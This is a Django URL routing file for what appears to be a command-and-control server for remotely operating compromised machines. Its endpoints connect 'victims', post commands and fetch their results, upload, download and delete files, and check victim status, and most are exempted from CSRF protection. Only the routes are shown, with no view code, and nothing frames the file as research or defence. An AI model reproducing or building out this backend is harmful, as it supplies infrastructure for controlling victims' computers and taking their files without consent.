from django.urls import path
from django.views.decorators.csrf import csrf_exempt
from .views import *

urlpatterns = [
    path('connectvictim',csrf_exempt(ConnectVictim.as_view())),
    path('startsession',csrf_exempt(StartSession.as_view())),
    path('endsession',csrf_exempt(EndSession.as_view())),
    path('postcommand',csrf_exempt(PostCommand.as_view())),
    path('getcommandresult',csrf_exempt(GetCommandResult.as_view())),
    path('getcommand',csrf_exempt(GetCommand.as_view())),
    path('postresult',csrf_exempt(PostResult.as_view())),
    path('uploadfile',csrf_exempt(UploadFile.as_view())),
    path('getfile', FileDownloadView.as_view()),
    path('deletefile', DeleteFile.as_view()),
    path('getvictimstatus',csrf_exempt(GetVictimStatus.as_view())),
]